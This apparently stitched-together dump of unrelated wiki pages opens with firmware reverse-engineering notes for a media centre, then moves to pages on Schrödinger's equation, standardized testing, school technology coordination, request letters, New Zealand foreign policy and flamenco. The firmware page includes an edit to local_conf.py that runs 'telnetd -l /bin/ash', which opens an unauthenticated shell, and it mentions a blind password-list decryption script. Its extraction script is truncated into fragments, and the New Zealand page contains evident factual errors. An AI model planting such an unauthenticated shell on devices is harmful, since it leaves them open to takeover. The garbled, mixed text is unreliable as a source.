==== Analyzing kernel file ====
Header magic number (0x270519) of this file shows that is u-boot type. By analyzing the rest of the file you found in offset 352 a gzip file (at least in reviewed files until now) that can be extracted with command:
&lt;source lang=&quot;bash&quot;&gt;
dd if=kernel.bin bs=352 skip=1 | gzip -d &gt; kernel.ucompressed
&lt;/source&gt;

By analizing this uncompressed file we found inside (at least in majority of firmwares) two other compressed files. One of them seem to be the kernel configuration file and the other one the initramfs.cpio required during compilation (if required parameter is established).

A new script has been created to find and decompress gzip files inside other files. As input needs the file/files in which you want to find the gzip file (as input you can use something like kernel1.2*)

        then

    done
    echo &quot;End of search&quot;
done
&lt;/source&gt;
In this case can be used to obtain gzip file from kernel file or used to obtain gzip files inside decompressed files extracted from kernel.
In order to clarify all this stuff, file hierarchy is shown below:

update.wup (use extraction script)
:header (include kernel file size in last 4 bytes)
:kernel (use gzip extraction script)
::kernel.uncomp (use gzip extraction script)
:::config (gonfig file for kernel compilation)
:::initramfs.cpio (needed file for compilation)
:middle (include software file size in last 4 bytes)
:software
:footer
:infoxml (xml information about update.wup file and device)


Note: There is a project called Tribbox. A mediacenter with similar especifications to ours (al least the processor) with info about mounting OS, etc. Can be useful: http://www.tribbox.com/

=== Software file ===
To date, we don't know exactly the format of software system, knowing that 'file' command gives &quot;data&quot; as output for this file. Guess that it is a squahfs file system and in addition is encrypted with aes-cbc-plain coding with 128 bits key. Probably image is decrypted by dm-crypt interface of kernel linux.

By joining all the discovers made, a script has been created which, from software file obtained from firmware file ([[#Extraction Script|extraction script]]) (wup) and other file with possible password list, tries to decrypt and know the underlying file system. Known problems:
* We're not sure of encrypting system used, thats why we're hitting out blindly.
* The script gives us a lot of false positive results, since always system is decrypted. The fact that determines if has been successful or not is the output of ''file'', we should expect something like squashfs filesystem or any thing like that.
Below, just a didactic code as an decrypting example in linux file systems and full partitions. We take no responsibility of use. Review before use is recommended.

=== Extraction script ===
This script in bash/shell scripting allows to obtain from one firmware update file (.wup), the corresponding files of kernel, software and XML information. It is completely GPL and we take no resposibility on its use. Whoever interested in functionality or effects must analyze it. Of course, any improvement, suggestion or contribution will be appreciated.

To date, we obtain six files from .wup update file. The main files are kernel and software, infoxml has limited interest, and the other files (header_bytes, middle_bytes and footer_bytes) are the bytes without identity in different parts of the file. Has been made like that so that joining all the files we could obtain a new original file without losing information.

&lt;source lang=&quot;text&quot;&gt;header_bytes # kernel # middle_bytes # software # footer_bytes # infoxml&lt;/source&gt;

This script has been sucessfully tested on the last update files of MediaTitan, ZoltarTv and Wyplayer.

== Updating a device with other device (brand) device ==
One of the problems found is that one device can not be updated with a different device (brand) firmware file. It seems to be that the reason is that each device has one indentifier and, in addition, the &quot;software&quot; part of firmware file is encrypted in different way for each device.

If this was simply like that, would be theoretically possible to create a firmware for a device with modified kernel part, and even so, update would be allowed. With each one of the 6 parts included in a update file, a new one would be built as the mixture of some different firmware files.

=== Script for mixing firmware files ===
To test the concept of mixing the contents of two firmware files a script has been created able to generate a new .wup file from two diferent files. Script disassembles each of the two original (just if disassembled parts are not available in folder) and offers a number of possible combinations. This can be interesting for verifying if any of those combinations allows us to update our device. As a general rule, from all options offered by the script, we're interested in those that mixes one part from a different device and the rest from our device. And more specifically the one that takes the kernel of another ant the rest of our own device. Generated files has not been tested yet, so we recommend caution in using them.

IMPORTANT: To run this script you need to change the value of variable EXTRACT_PROGRAM and set the path to [[Extraction script | extraction script]].

The operation is simple:
&lt;source lang=&quot;bash&quot;&gt;
wup_mix &lt;update_file1&gt; &lt;update_file2&gt;
&lt;/source&gt;

= Telnet access to device =

In order to get telnet access to device is mandatory to modify one file in HD. For that, you need to get out HD from device and plug to PC to get access. Any linux distribution will allow access to HD and modify that file, even a Ubuntu Live cd or any other distribution.

The file to modify is located in partition 1 (JFS). To mount it, execute this commands:

(note: sda must be changed to fit your partition data and all commands must be executed as root, i.e. by adding &quot;sudo&quot; before command)


 $ mkdir /mnt/sda1
 $ jfs_fsck /dev/sda1
 $ mount /dev/sda1 /mnt/sda1

Once mounted, we must edit &quot;local_conf.py&quot; file by adding lines below at the end of file:

 import os
 
 os.system('telnetd -l /bin/ash')

Now we dismount partition ( umount /mnt/sda1 ) and plug HD in device again.

From now we should have telnet access to device: (if is connected to network, obviously)

 $ telnet device_ip

      <text xml:space="preserve">Like Maxwell's equations describe light wave equations in the same way Schrodinger's equations describe equations of matter waves.

The equation was discovered by an Austrian physicist, Erwin Schrodinger in 1926.  Schrodinger's equations involve complex mathematics and up to now several solutions to the  equations have been derived for different situations.

The activities have been  designed to develop specific knowledge &amp; associated skills that form the core of the assessment standards of the various grades. These must not be considered, nor taken to be &quot;technology&quot; - They are only enabling activities designed  specifically to assist you with ideas for the development of concepts, what needs to be taught, learnt, so that learners have a chance at success when engaging in technology. The activities are not contextualised in any module as such and are not about making a product,  as our focus is on the development of concepts.

I have never been a fan of standardized testing.  I do agree with the reading that children should not be assessed on one single test.  There may always be one or more factors that can affect bhow a child does on a test at any given time.  If teachers are going to use standardized tests as a way to assess what children are learning then they need to incorporate other form of tersting in order to truly assess each student. [[User:Lwill031|Lwill031]] ([[User talk:Lwill031|talk]]) 18:15, 24 July 2009 (UTC)

I feel that standardized testing is not an accurate measure of a student's intelligence. I agree with the reading in stating that a single test is not an indicative measure of that student's academic abilities. There may have been other external contributing factors that could affect a low or lower score on the test. In addition, I do feel that many people use standardized testing for the benefits. Like mentioned in the article, it is relatively quick and inexpensive to score and distribute. I feel that students should be allowed other forms of tests or performance measurements in addition to the standardized tests when measuring academic abilities. [[User:Rburt005|Rburt005]] ([[User talk:Rburt005|talk]]) 15:16, 22 July 2009 (UTC)

Oh…dreaded standardized tests.  I am actually not so opposed to testing students.  We must ensure that our kids are meeting basic skill levels.  It is the notion that we have narrowed and confined curriculum so much that teachers have no leeway in the types of activities they can do in their classrooms.  Instead of a more hands-on or project-based approach, our classrooms are still very teacher-centered.  We are test teaching.  We are still giving loads of worksheets and homework that are not good methods of formative assessment.  We lose students to boredom and disinterest.  There has to be a better way.  [[User:Abitt002|Abitt002]] ([[User talk:Abitt002|talk]]) 18:14, 23 July 2009 (UTC)


I really don't think standardized testing is always a fair assessment of a student's progress. It kind of depends on the student, but in the long run I much prefer to use written assessments to give students more leeway to explain and elaborate on what they've learned– either that or assessment through projects and presentations. I don't think the culmination of everything you teach should lead up to fill in the bubble tests. It can only imagine how incredibly frustrating and unrewarding it would be for me to have to deal with it. [[User:Hsmit022|Hsmit022]] ([[User talk:Hsmit022|talk]]) 17:24, 24 July 2009 (UTC)

The moment I begun to understand what standardized testing was, I genuinely detested it. Teachers, principals, administrators, schools and everyone in general made it seem that my whole life virtually depended on a test. That if I did not pass, I would not be able to attend college or get a good higher education, and my life would be effectively over. I moved to Virginia when I started 7th grade, and until I graduated from high school, I passed each SOL. By the time I started going to college, I realized that this was not exactly true. I still had to work hard if I wanted to receive a degree, but my life was not over if I did not pass on a test, like the SAT. I actually do not hate the test itself, because I believe that it is needed in some situations such as during the middle and end of the year. What I really hate about standardized test is the constant…attention behind it. As soon as you enter 3rd grade teachers are stressing the importance of SOLs, and when you enter your junior and senior year of high school, they are stressing APs and SATs. I just think that people need to take a step back and look at this thing called “standardized testing”, because we are making it much bigger than it needs to be. Instead teaching children new concepts, we are actually just teaching them how to take a test. [[User:Adart001|Adart001]] ([[User talk:Adart001|talk]]) 01:46, 26 July 2009 (UTC)

I can whole heartedly say that I am against Standardized Testing.  I think if it is used as a means to evaluate a student and the educator's teaching abilities than fine, but to place such heavy expectations and threaten the progression of the student is unfair.  I personally do not test well, the results merely reflect a big ball of nerves vs. my true  academic abilities.  I'm aware that it is a quick unbiased way to determine skill levels, however, that's all it should be.  We as educators as well as student's shouldn't be so terrified of these tests. These scores can make or break a student regardless of what has been achieved thus far. We're placing heavy demands on our children, when they should be enjoying the many facets of learning. [[User:Rpaige|Rpaige]] ([[User talk:Rpaige|talk]]) 15:31, 26 July 2009 (UTC)

I think that standardized testing is very helpful.  I am in full support of the NCLB legislation passed in the past decade.  I think it is good that standardized tests are now required for every single public school in the United States.  Standardized tests are good because they keep teachers accountable for their teaching and for student learning.  Such programs such as NCLB, which rewards schools who do well on standardized tests, motivates teachers to put thought and care in to teaching, assessment, and into understanding how students learn.  Other kinds of learning enrichment measures can still be implemented with such an emphasis on standardized tests; in fact what might be helpful is for school administrations to find a way to encourage some non-standardized test focused teaching activites, without denying the importance of the latter.

[[File:Linking to the world.jpg]]
===Introduction===
The learning environment is constantly changing and the tools and methods incorporated continue to grow and change. Technology is an interesting term in that viewed from a contemporary context it seems somewhat easily defined. But if we think carefully we find that amount of change that takes place is extraordinary and the speed at which this change takes place is accelerating rapidly.

If we think of the not so distant past, technology in the classroom could refer simply to the use of books. A few decades ago the technology for document preparation moved to electric typewriters from manual machines. In a short time span we have seen the advent of personal computers, which quickly moved from professional environment to the educational environment. While we have seen initial domination of Apple computers in educational environments, a multiplicity of vendors and technologies can now be found and the conceptualization of ‘computer’ as technology is quickly disappearing. So, how do we define technology today?

===A view of technology===
As we move through the year 2009 we find that not only is it difficult to define a single hardware and software environment, it is also difficult to pin down location. The physical devices being used still incorporate a familiar computer framework. PC’s using familiar operating systems such as Windows and Mac OS X are commonplace. Network technologies allow not only for the interconnection within the educational environment, but also to the rest of the world through the Internet. This system of interconnected networks allows communication through its most popular form: The World Wide Web. This communications protocol allows text, graphics, audio and video to be exchanged between multiple platforms and for many years has been an environment that students could benefit from being on the receiving end of information. As new tools emerge, this is rapidly changing.

===Web 2.0===
	It is difficult to exactly define what web 2.0 means because the definition is hotly debated. What can be said about this environment is that, in general, it represents an environment on the World Wide Web that changes how we interact with data and with each other. A few examples of these tools include video sharing and audio/video interactivity such as Skype, social networking (Facebook), Google products including maps/streetview, docs, and soon Wave. It remains to be seen how some of these new changes will effect how we interact with this technological environment. While we are used to having access to our working environment locally there is a growing move toward ‘cloud’ computing. Google is pushing this and hopes to push this technology with Wave and Chrome OS. The changes that we see in the Web 2.0 environment do not necessary represent change in hardware infrastructure, rather the software systems running on these hardware systems.

===Smart devices and more===
Other means of technology that are becoming commonplace include smart devices or smart phones. At this point in time it makes no sense to refer to a smart device simply as a cell phone. These devices are capable of making phone calls certainly, but they also have the capacity to navigate the Web, run calculators, maintain multiple clocks with alarm notices, play music and send text messages. Not only can you take photos and video, but you can then post them directly to social networking sites instantly as well as send and receive email. Many new devices can make their way into the learning environment such as iPods, digital cameras, video, podcasting, and Skype. Blogging is a platform where individuals can not only create an online journal or log, but it also creates opportunities for others to respond. This can be its own form of educational interaction and provide feedback to ideas such as using technology by teachers in an academic setting.These should be consider freeing to the development of the learning environment not frightening or overwhelming.
===Professional development===
One of the keys to the successful implementation of technology in the classroom is a careful plan for professional development. Installation of new equipment and leaving the teacher to figure out how it works and how it applies pedagogically is a recipe for disaster. 

In order to make any technology implementation a successful experience there are five critical element that must be considered. Time, training and development, teacher involvement, access to the equipment, and ongoing support (Brown, 2004iv).
====Time====
Teachers must be afforded the time to actively experiment with the technology they are going to be working with in the classroom. This time allows them to play with their curriculum and see how the new tools work. It provides for opportunities to make mistakes and work their way out of them. It gives them the confidence to understand the tools so that they can concentrate on best classroom practice with the support of the technology rather than focusing on hoping to make the technology work under pressure.
====Training and development====
Training and development should be designed to support the specific needs of the teachers. The tools they are going to use in the classroom should be specifically addressed and the timing of the training and development should coincide with actual practice. Providing professional development in for a teacher in June for programs that will be installed the following September does no good at all. 
====Teacher involvement====
In order to make the professional development a meaningful experience it is imperative that the design comes from a collaboration between the technology coordinator and the teachers. Professional development must directly relate to the technologies that teacher will use and in the form necessary that will support the educative process. It cannot be designed isolation and cannot be a ‘canned’ system intended for a ‘one size fits all’ environment. All too often professional development is designed around large groups with basic step-by-step delivery systems that provide little more to the teachers that when they first entered the session. In some instance, teachers are not even place in front to the technology they are expected to use but are instead give presentation hand outs and expected to translate this into a meaningful learning experience. 
====Access to equipment====
When teachers have participated in some form of professional development it is necessary to get them directly involved with the new technology immediately. This required that careful planning has been taking place with the technology coordinators so that equipment isn’t lying around waiting for professional development to take place, or that teachers are left for months without the new technology following professional development. They will need immediate access so they can begin the process of active experimentation and implementation in their classes. 
====Ongoing support====
It is through the process of active use and experimentation that the teacher will encounter problems and is the role of the technology coordinator to ensure that support systems are in place. There are two possibilities that may occur when difficulties arise. One may come from the mistakes performed by the teacher when attempt to incorporate the use of the new technology within their learning environment. Put simply, they don’t know fully how to use the new technology. A very simple example might be that they want to incorporate multiple columns in a word processing document so their students can create brochures, and they themselves don’t know how to create multiple column. As issues such as this come up, support systems must be in place so that the teacher does not have a large delay in implementing this process. Another situation they may encounter is specific component failure. If a printer or scanner doesn’t work, if classroom computers lock up, or if access to the World Wide Web is interrupted during a critical period it will be necessary to have available technical support available to resolve these issues on a timely basis.
===Technology coordinator===
With the flood of available technology coming into the classrooms the responsibility of planning and implementation becomes ever more difficult. The role of the technology coordinator is much more complex than just an individual who can work with teachers to support the existing technology systems. The technology coordinator should be an individual who is familiar with the learning environment and cognizant of the challenges of integrating technology with curriculum. Simply placing new technology in a classroom is no assurance that it will be used. The use of technology in a classroom is no different from any other instrumentality. It must have a defining purpose and support the learning process as it is used. Technology is not external to the learning environment even though it is often used not as a tool to enhance learning but instead as a reward system for behavior in the classroom. By working closely with teachers, technology coordinators can help determine the technological needs of teachers, plan to support the use of the technology through effective professional development, and determine appropriate support when difficulties arise.

An additional role of the technology coordinator should be a forward looking scout. As myriad new tools surface in is likely that teachers simply do not have the time to scour what is out there. Simple informational overviews may provide a wealth of ideas that teachers could then incorporate into their learning environments. It may make a tremendous difference if teachers could transition from students doing group work by typing their own individual papers and to then consolidate them later as a single group report, to the use of Google docs to work together in a shared environment. In continuation, they them may create a group presentation using the presentation feature for the teacher to review or for presentation in a class. For the teacher it might be a wonderful transformation to create a presentation with photos and video in the presentation of Google docs where it is centrally stored. There is no need to move files, worry about forgotten flash drives, and provides the ability to involve other academics to review and collaborate. 

But they need to be aware of these tools before they can consider their use. Creating a simple tutorial to reinforce skills directly from the computer screen using Screen Toaster and greatly simplify not only classroom experiences but enhance distance learning activities. Many textbooks provide long tutorials with occasional screen shots, which can be helpful but also confusing. Short movies of computer techniques can prove to be beneficial for all and greatly aid those who are very visual in nature.
===Working with teachers===
Using technology is not a process that is imposed on teachers. It should be an opportunity where teachers are provided with an opportunity to enhance their practice and focus on who student learning will be affected. Jamie McKenziev emphasizes the need to differentiate between training and technology professional development. Professional development is a long term process which engages teachers within a context of adult learning, addressing needs of immediacy of application, problem-based, and engaging which will lead to their own knowledge construction found within constructivist theory (. Ultimately, teachers are the only individuals who directly add value to the learning process. They are the ones who directly work with students and are involved in the learning process. All other people serve to support this activity. They must all working the teachers for a successful learning environment.
===Plan for instructional support===
As teachers learn to use and incorporate new technology into their instructional environment they are going to need support. The support can come from a variety of areas and all of them must be understood and taken advantage of.
===Help Desk===
Officially there should be a technology support number that teachers can call to receive assistance. The assistance can come in the form of hardware and software support from the perspective that they are unsure how to use this. This other situation is that the equipment or software in not functioning properly and they require assistance. In both situations they should have a number to call and there should be a documented action plan with specific response guidelines. In is not unprecedented to have teachers call tech support and have not idea when and if they may ever hear back again.
===Peers===
As teachers work with technology they discover new and interesting strategies to incorporate this into their curriculum. Some experiment more than others and it is here that teachers can share their experiences (and frustrations) and collectively solve problems. They are their own wealth of information and should be encouraged. Administrative support for technology exchanges should be considered.
===Students===
Yes, students. It is very difficult-and potentially fearful-for some teachers to admit that their young students may know more than they do when it comes to technology. For those who are open and relaxed, admitting that they don’t know all of the answers when it comes to using computers, it can be a transformational environment. They can learn from each other and giving up some power to the students can enrich the learning environment.
Be open and don’t be afraid to experiment, to engage others, to admit that there is much you may not know and above all, to have fun. It is a process of learning and learning is something that all teachers should revel in.

      <text xml:space="preserve">A formal letter requesting some service and/or good from another individual within a professional business relationship.  

Things to keep in mind while writing a letter of request:

* Know the audience you are writing this letter to.
* Keep it concise but not so concise that your recipient needs to try to deduce what you are asking for beyond what is plainly stated.
* Know your purpose in writing the letter.

Always send via your recipients preferred means of transmission.


=='''How to write a letter of request.'''==

==='''Choose Your Medium'''===

Before beginning your letter it is important to select whether you will be sending an e-mail, a letter, or a memo.
Depending on your company, some mediums may be more appropriate than others.  For instance, e-mail might be used for day-to-day updates and communication, memos may indicate policy changes, and letters might be ordinarily used by a supervisor.

Also, it is important to keep in mind the efficiency of each medium.  

E-mail is the quickest method of communication.  E-mail requires no paper, stamps, or envelopes and may be relatively cost efficient in the business setting; however, e-mail is often times less personable and may give off the wrong message if it is not written carefully.

Letters and Memos are a more personable method of communication.  Things that come in the mail often times seem more important and authentic; however, letters and memos take much longer to exchange than e-mails.  Letters and memos also require paper, stamps, and envelopes which can take time to sort and may be costly for a company.

==='''Know Your Audience'''===

Understanding your audience plays an important role in writing your letter.  

Be sure to keep in mind:

*Who is your audience?
*What do they know already?
*What is their purpose in reading your letter or memo?
*How receptive are they likely to be to your message?

Other things that may be important to keep in mind are:

*Do you have a good relationship with your audience?
*Do they ordinarily accept or reject your explanations and recommendations?
*Is your audience positively or negatively disposed to your subject and purpose?

Considering all of these things will help you determine how to write your letter.  (do we want to expand this section?  More detail?)

==='''Determine Your Purpose'''===


==='''Direct vs Indirect style'''===

It is often important to decide which style of writing you will be adapting in your letter.

Direct style of communication is generally preferred.  Direct style gets straight to the point in the beginning, follows up with an explanation or clarification, and ends politely.  Direct communication is often used in situations of urgency.

Indirect communication is useful when a negative reaction is anticipated, or if the message is not urgent.  Indirect style usually begins graciously, provides background information or reasonable arguments, and closes politely.  Often times this style of communication is preferred by an international audience. (326)

Dear Big Boss Person            

* ''Salutation always aiming to be as close to the final reader as possible.
''
I am writing to inquire about getting a hypo-allergenic wall covering from your business I am wondering if it would be possible to get this in a very timely manner.  I understand you have a number of different models of wall coverings I would be interested in receiving information on these so that I can make an informed decision about your products.  

*'' The beginning of the letter should get directly to the point of what you are requesting the person reading this wants to know why you are writing or they will stop reading it rather quickly.''

I recently developed an allergy to a number off environmental factors within my home and so I need for a product like yours urgently.

* ''Sometimes some supplemental information is necessary to justify why you want the materials you are requesting in the time period you have requested and to add legitimacy to your request.''

if you have any further questions please contact me at (321) 987 - 6543 or through email at john.doe@deer.net

* ''Always have some way of being contacted at the end of your letter of request.  While you have your address earlier, never assume that they want to look up at the top to find it.  Reprint it here for convenience for them.''

Sincerely

John Doe

{{book title|New Zealand's Search for Security 1945-1985}}

This wikibook is designed to become a collaborative textbook for New Zealand secondary school students studying the above topic.
Guiding questions for this topic are:
==(a) What new directions did New Zealand foreign policy take after World War II?==
===Background: New Zealand in the post-war period===
Important issues confronting New Zealand in the post-war period:
* The Demise of Great Britain as a global power. 
** The Fall of Singapore. The fall of Singapore, one of the biggest defeats in the history of the British Army by the Japanese Army, was on February 15th 1942. The British troops underestimated the Japanese armies, so they were not prepared [[Image:Coventry bomb damage H5600.jpg|thumb|right|alt=Coventry|Damage to the city of Coventry caused by Nazi bombs.]]
** Damage caused by Nazi bombing during the Blitz. The Blitz was the sustained bombing of Britain by Germany. This happened between 7th of September 1940 and My 10th 1941 during world war 2. its intended goal of forcing and demoralising Britain into surrender was not accomplished. The Blitz did little to assist Germany in invading Britain. After the Blitz civilians felt they had an enormous role to play to protect there cities. Many civilians who were not able to join the military became members of the home guard and more importantly the air raid precaution service. The Blitz destroyed hundreds of buildings and many families. This event destroyed British cities but failed to destroy their moral. 
** Economy rebuilding as a result of damage suffered during the war effort.
* The beginnings of the Cold War between U.S.A. and the U.S.S.R.
* The economic vulnerability brought about by a reliance on a single (European) market for most of their products. New Zealand main exports were primary products in the 1940s and 1950s.
* The psychological damage to the nation caused by Japanese aggression in the Pacific. These acts of aggression included:
**The Japanese Attack on Pearl Harbor. On the 7th of December 1941, the Japanese commenced a surprise attack on the American Navy base of Pearl Harbor. It was a devastating defeat for the American forces, and it is particularly notable that 8 battleships were sunk or damaged. The attack came without a formal declaration of war, and was infamous in the eyes of Franklin D. Roosevelt, who shortly afterwards declared war on Japan and entered WWII. The decisive show of force and the nature of the attack shocked New Zealand, who were forced to face the changing tactics of warfare, where combined navy/air tactics dominated.
** the destruction of the HMS Prince of Wales and the HMS Repulse in Singapore
** the bombing of Darwin and the capture of a Japanese submarine in Sydney Harbour. The bombing of Darwin(19 February 1942) was a Japanese air raid on Darwin initiated about 200 miles Northwest of Darwin. The bombing was lead by the same commander who attacked pearl harbour Mitsuo Fuchid. there were six aircraft carriers involved some of these were Akagi, Kaga, Soryu and Hiryu. In May 1942, Sydney Harbour was attacked by Japanese manned submarines. There were three enemy submarines that entered the harbour and began trying to destroy ally ships. Two of the crews of the submarines committed suicide and the other was not recovered until 2006 where the wreck was found off shore.
** the surveillance of New Zealand by Japanese reconnaissance planes.
* Increasing contact with the United States as a result of U.S. servicemen being stationed in New Zealand. 
**Quick information: At any one time between June 1942 and mid-1944 there were between 15,000 and 45,000 American servicemen in camps in New Zealand across New Zealand. Their lives were based in these camps. Camp life must have seemed spartan if you landed directly from the United States (some soldiers were no more than 17 years old), comfortable if you arrived from the heat of a Pacific battle.
**Entertainment: The American soldiers entertainment was based around sport these included crowds of 20,000 watching a baseball game at Wellington's Athletic Park in January 1943, also Boxing tournaments were held, intense competitive games of American football was played on Eden Park in Auckland between the army and the marines. Also In Wellington in mid-1943 an old Wakefield Street building was converted into a gymnasium and sports stadium for basketball and badminton. 
[[Image:Nagasakibomb.jpg|thumb|right|alt=Nagasaki|The bombing of Nagasaki 1945]]
* The emergence of nuclear weapons as a major factor in global relations. After the bombing of the Hiroshima and Nagasaki by the United States  the world saw the impact and scale of mass destruction a single nuclear bomb can cause. This caused outburst of fears from many countries and was received as a very controversial way to end the war. The sheer power of nuclear bombs was enough to stimulate many countries into developing nuclear weapons. Among these countries were United King, France, the Soviet Union and the People's Republic of China. Countries who posses nuclear weapons quickly rose as very influential powers in their region and caused many international tensions. New Zealand tested Nuclear weapons along with the Americans and the British in Australia. They had not guinea pigs but sacrificial lambs wearing different protective clothing to see if the protective clothing could help against the impact of the nuclear tests.

===Involvement in the United Nations===
[[Image:Peter_Fraser.jpg|thumb|right|alt=Peter Fraser.|Peter Fraser. Prime Minister of New Zealand 1940-1949.]]
Prime Minister Peter Fraser guided New Zealand's foreign policy in the post-war period, and he played a large role in the creation of the United Nations Organisation also. The UN was founded in 1945 after World War II to replace the League of Nations, to stop wars between countries, and to provide a platform for dialogue.The New Zealand government had always been pro-League of Nations, but with the emergence of the United Nations as a pan-global organisation dedicated to security and peace, NZ stepped up its support. PM Peter Fraser was very vocal during the 1945 San Francisco conference that established the UN (or the UNO as it was known then) and came to be seen as something of a spokesman for the smaller nations of the world. Fraser also opposed the veto right of permanent members of the security council. 
This increased support for an international organisation was driven by a number of factors:
* the demise of Great Britain as a world power
* the passing of the Statute of Westminster
* the fear that Japan (and other countries) might represent a threat to the nations of the pacific, and
* the building of tension that eventually became the cold war
Fraser was critical of the draft plan for the UN, say it asked the great powers to make 'no pledges, no guarantees and no undertakings.'&lt;ref&gt;p.57 Mackinnon, Independence and Foreign Policy&lt;/ref&gt;

&quot;In 1945, representatives of 50 countries met in San Francisco at the United Nations Conference on International Organization to draw up the United Nations Charter. Those delegates deliberated on the basis of proposals worked out by the representatives of China, the Soviet Union, the United Kingdom and the United States at Dumbarton Oaks, United States in August-October 1944. The Charter was signed on 26 June 1945 by the representatives of the 50 countries. Poland, which was not represented at the Conference, signed it later and became one of the original 51 Member States.

The United Nations officially came into existence on 24 October 1945, when the Charter had been ratified by China, France, the Soviet Union, the United Kingdom, the United States and by a majority of other signatories.&quot; &lt;/div&gt; &lt;ref&gt;http://www.un.org/aboutun/history.htm&lt;/ref&gt;

===Involvement with the Commonwealth===

===The ANZUS treaty.===
ANZUS was a collective military security treaty signed by Australia, New Zealand and the United States. It was negotiated in 1951, formally accepted by all three countries in 1952 and marked the beginning of New Zealand's movement away from 'mother Britain' towards the emerging super-power, the United States.
===The SEATO treaty.===

==(b) Why and how has New Zealand become increasingly involved in South-East Asia and the Pacific since World War II?==
===New Zealand’s relationships:===

'''Western Samoa'''

Support towards independence:

Aid and Development:

'''The Cook Islands'''
New Zealand gave many different types of aid and development assistance to the Cook Islands.They did this through a organisation called NZ AID. This aid included education and training, economic development, marine resources, governance and gender equality.
Education aid was 40% of New Zealand and Australia's aid towards the Cook Islands. The Education aid is a long term strategy that is chosen to improve the schooling of pre-school to vocational studies including those with special needs.
NZAID/AusAID assistance to the education sector focuses on:
* Support to schools and the Ministry of Education. This includes the provision of teachers and curriculum advisers, upskilling of principals, heads of department, and upgrading of school libraries
* Refurbishment of school buildings
* In-country training, particularly for trades such as automotive, electrical and carpentry; business management and tourism
* Short-term training awards in New Zealand
* Scholarships to study in New Zealand and the Pacific region with priority given to tourism, finance, education/teaching, marine, environment and health.
NZAID gave aid to the cook islands also by developing their economy.

Support towards independence:

Aid and Development:

'''Niue'''

'''Support towards independence:'''
'''
''New Zealand helped Niue develop independence in various ways, some of which are listed below.''
* &quot;Halavaka ke he Monuina Arrangement (HkhMA) for a Programme of Strengthened Cooperation with Niue was signed by the New Zealand Prime Minister and the Niue Premier on 30 October 2004. The arrangement facilitates closer cooperation between New Zealand and Niue government agencies, representing a major shift in New Zealand's approach to managing its relationship with Niue.&quot; 
* New Zealand invested NZ$20 million over five years in &quot;capital and infrastructure projects&quot; which saw a strengthening of Niue's self-reliance. &quot;A large portion of infrastructure spending will be allocated to the development of the new Niue hospital.&quot;


''These have all helped Niue develop independence, through the help of New Zealand.''
[quoted from http://www.beehive.govt.nz/node/21357]


'''Aid and Development:'''

*NZ assists in Niue's education by setting up the education development project which is aimed at improving the quality of early childhood, primary and secondary education in order to sustainably improve outcome for students.

* A further NZ$10 million over five years will strengthen links between New Zealand and Niue government departments. NZAID's immediate priority is to link New Zealand public service expertise with Niue's public sector capacity gaps. This will require a new culture of learning and more active involvement and support from New Zealand government agencies, including ongoing mentoring and other support arrangements.


'''The Tokelaus'''

Support towards independence: there was a Tokelau Islands Act of 1948

Aid and Development: about 4 million dollars annually to maintain public services. In addition, other than aid, Tokelauans remit money back to relatives in the island.

===Some key dates:===
* 1947 The Statute of Westminster was passed, making New Zealand an independent nation.
* 1951 ANZUS Treaty signed
* 1954 SEATO (the Manila Treaty) was signed.
* 2009 Tokelau is NZ's only remaining independent nation

===Military involvement: Korea, Malaysia, Vietnam.===

==(c) What was New Zealand’s role on the international stage 1970–1985?==
===The role of foreign aid and development assistance;===
===Opposition to nuclear testing, and the role of peace groups;===
===Reassessment of treaty obligations.===

      <text xml:space="preserve">Often, the difference between success and failure as a young adult writer comes down to your ability to truly ''read'' young adult literature, and understand the mechanics behind it. The most important skill you will ever learn is how to read like a writer: how to distinguish good fiction from bad, an enthralling read from a dull one. Through reading the instant classics of the new generation: J.K. Rowling's ''Harry Potter,'' Ann Brashares's ''The Sisterhood of the Traveling Pants,'' and Suzanne Collins's ''The Hunger Games'' to name a few, you will hopefully gain greater insight into what will make your book a success and what will mark it for failure from day one. 

The &quot;chapters&quot; are in no particular order, the book titles are organized by genre. This book is essentially an extended reading guide from a young adult writer's perspective.

==Introduction==

Flamenco is the music of Spain. In Spain the word flamenco is not just associated with the guitar but also the people, songs and dances of Spain. The history of flamenco follows that of Spain. When the Moors ruled Southern Spain they brought with them their instruments and the most important of these was the Ud. This eastern lute is still to be found all over the world but in Spain it collided with European ideas and flamenco is the product. Flamenco is woven into the life of the region of Andalucia where it originated and the people actively engage in the songs and dances. The guitar has always been the main instrument used in flamenco to support the dancers and singers due its percussive timbre. The early flamenco guitarists very rarely played solo; their role was purely to provide music for the dancers and singers. The rise of the solo flamenco guitarist is a late development and many of the great flamenco soloists are also renowned for their ability to accompany singers and dancers. 

==Flamenco Guitar==
[[Image:Belen maya.jpg|thumb|right|The flamenco dancer Belen Maya in traditional costume. Image: Gilles Larrain]] 

The modern classical guitar and its physical development can be traced back to the Spanish guitar-maker Torres. Alongside the classical guitar is the flamenco guitar. The flamenco guitar has the same history and the greatest luthiers in Spain have always made both types of guitar. The main structural difference the flamenco guitar has in relation to the classical guitar is a thinner body. This creates a timbre that is sharp and percussive. This is considered the ideal sound with which to accompany dancers. The flamenco guitar also has wooden tuning-pegs, which is the traditional method of construction for all early guitars. The need for the classical guitar to be able to be heard in a concert hall and the demand for greater resonance from classical composers; means that the classical guitar has left behind the use of wooden tuning-pegs and its body size has increased in comparison to the flamenco guitar. In many respects the flamenco guitar is similar in construction to the guitars of earlier centuries. 

==Flamenco Artists==

Paco de Lucia and Sabicas are two flamenco guitarists that all students of the guitar should be aware of. Both have played a major part in the changes of this evolving art form. Sabicas developed the technique of tremolo and Paco de Lucia extended the harmonic framework with his use of jazz chord voicings. Juan Martin is a flamenco guitarist who keeps the traditional forms sharply in focus and provides the clearest guide for beginners wishing to study the various flamenco forms. 

==Flamenco Forms==

The flamenco forms have been developed over a long time. There is a distinction of terms when flamenco forms are described. When flamenco vocal forms are described they are called &quot;cantes&quot; and the guitarist forms are called &quot;toques&quot;. Each flamenco form has certain rhythmic and tonal qualities that encapsulate the form and flamenco guitarists are expected to have a knowledge of the origin and usage of these.

* Bulerías 
* Soleares
* Seguirillas
* Tientos

==Flamenco Chord Progression==

This is a very common chord progression that most guitarists who wish to learn flamenco start with.

&lt;font face=&quot;Courier New&quot;&gt;
&lt;gallery perrow=4&gt;

&lt;/gallery&gt;
&lt;/font&gt;

A descending one octave Phrygian mode starting from the note &quot;E&quot; which can be played over the above chord progression.

&lt;br style=&quot;clear:both&quot; /&gt;
==Flamenco Technique==

